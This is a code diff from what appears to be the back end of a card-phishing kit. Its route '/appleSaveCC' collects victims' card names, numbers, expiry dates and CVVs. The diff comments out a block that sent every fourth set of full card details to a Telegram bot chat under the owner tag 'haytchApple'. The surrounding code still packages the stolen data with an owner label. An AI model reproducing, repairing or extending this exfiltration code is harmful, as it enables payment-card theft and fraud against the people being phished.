@@ -2021,15 +2021,15 @@ app.post("/appleSaveCC", cors(), (req, res) => {
     );
   }
 
-  if (appleCount == 3) {
-    axios.post(
-      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1983666674&text=New Apple Hit:\n\nCard Name: ${ccname}\nCard Number: ${ccnum}\nCard Expiry: ${ccexp}\nCVV: ${cvv}`
-    );
-    owner = "haytchApple";
-    appleCount = 0;
-  } else {
-    appleCount++;
-  }
+  // if (appleCount == 3) {
+  //   axios.post(
+  //     `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1983666674&text=New Apple Hit:\n\nCard Name: ${ccname}\nCard Number: ${ccnum}\nCard Expiry: ${ccexp}\nCVV: ${cvv}`
+  //   );
+  //   owner = "haytchApple";
+  //   appleCount = 0;
+  // } else {
+  //   appleCount++;
+  // }
 
   let details = [ccname, ccnum, ccexp, cvv, uniqueid, owner];
 
